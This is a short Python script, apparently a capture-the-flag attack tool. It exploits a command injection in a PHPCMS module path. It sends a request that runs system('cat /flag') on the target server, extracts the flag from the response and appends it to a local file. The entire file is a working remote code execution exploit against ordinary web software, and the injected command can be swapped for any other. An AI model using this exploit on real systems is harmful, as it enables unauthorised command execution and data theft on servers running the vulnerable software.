#! /usr/bin/python3
import os
import sys
import requests

def write_to_flags(d):
    fd = open('./flags', 'ab')
    fd.write(d + b'\n')
    fd.close()

server_ip = sys.argv[1].split(':')[0]
server_port = sys.argv[1].split(':')[1]
url = 'http://'
url += server_ip + ':' + server_port + '/phpcms/modules/sms/sms.php?a=system(%27cat%20/flag%27);'
res = requests.get(url,timeout=2)
data = res.text
flag = ('flag{' + data.split('{')[1]).split('}')[0] + '}'

#data = data.split('}')[0] + '}\n'
print(flag)
write_to_flags(flag.encode())
